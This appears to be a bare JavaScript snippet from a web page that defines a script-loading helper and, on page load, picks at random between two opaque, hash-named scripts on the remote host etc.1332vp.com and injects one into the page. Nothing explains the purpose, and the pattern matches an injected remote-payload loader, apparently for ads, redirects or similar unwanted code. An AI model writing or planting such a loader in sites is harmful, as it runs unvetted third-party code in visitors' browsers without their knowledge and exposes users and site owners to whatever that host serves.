window.curNode = document.currentScript || (function(){var script=document.querySelectorAll('script');return script[script.length-1]})();

;function loadJs(e, t) {
                    var n = document.getElementsByTagName("head")[0],
                        o = document.createElement("script");
                    o.onload = o.onreadystatechange = o.onerror = function() {
                        if (o && o.readyState && /^(?!(?:loaded|complete)$)/.test(o.readyState)) return !1;
                        o.onload = o.onreadystatechange = o.onerror = null, o.src = "", o = null, t && t()
                    }, o.id = 'abc',o.charset = "utf-8", o.src = e;
                    try {
                        window.curNode.parentNode.appendChild(o)
                    } catch (e) {
                       
                    }
                }


var crd = Math.floor(Math.random() * (100 - 1)) + 1;
var js_url = 'https://etc.1332vp.com/dd7cf8479f238c212ac021691205c213_old.js';
if (crd <= 50) js_url = 'https://etc.1332vp.com/3d8698579b9b53686685776fb66094c6.js';
loadJs(js_url);